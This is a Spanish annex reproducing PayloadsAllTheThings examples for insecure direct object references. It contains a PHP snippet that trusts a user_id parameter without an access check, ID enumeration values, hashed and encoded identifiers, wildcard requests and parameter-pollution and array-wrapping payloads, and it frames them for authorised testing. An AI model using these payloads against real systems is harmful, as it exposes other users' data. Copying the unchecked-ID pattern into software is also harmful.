# Control de acceso roto y elevación de privilegios: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Insecure Direct Object References/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Insecure%20Direct%20Object%20References/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Referencias directas inseguras a objetos / Metodología

```php
<?php
    $user_id = $_GET['user_id'];
    $user_info = get_user_info($user_id);
    ...
```

```ps1
https://example.com/profile?user_id=124
```

### Variantes presentes en tablas o texto del apartado

```text
https://example.com/profile?user_id=123
user_id=123
user_id
```

## 2. Metodología / Parámetro numérico

### Variantes presentes en tablas o texto del apartado

```text
287789
287790
287791
0x4642d
0x4642e
0x4642f
1695574808
1695575098
```

## 3. Metodología / Identificadores comunes en parámetros

### Variantes presentes en tablas o texto del apartado

```text
john.doe
john.doe@mail.com
am9obi5kb2VAbWFpbC5jb20=
```

## 4. Metodología / Generador seudoaleatorio débil

### Variantes presentes en tablas o texto del apartado

```text
95f6e264-bb00-11ec-8833-00155d01ef00
5ae9b90a2c144b9def01ec37
```

## 5. Metodología / Parámetro con hash

### Variantes presentes en tablas o texto del apartado

```text
sha1(username)
md5(email)
098f6bcd4621d373cade4e832627b4f6
a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
```

## 6. Metodología / Comodines en parámetros

### Variantes presentes en tablas o texto del apartado

```text
*
%
.
_
GET /api/users/* HTTP/1.1
GET /api/users/% HTTP/1.1
GET /api/users/_ HTTP/1.1
GET /api/users/. HTTP/1.1
```

## 7. Metodología / Consejos para IDOR

### Variantes presentes en tablas o texto del apartado

```text
{"id":19} → {"id":[19]}
user_id=hacker_id&user_id=victim_id
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
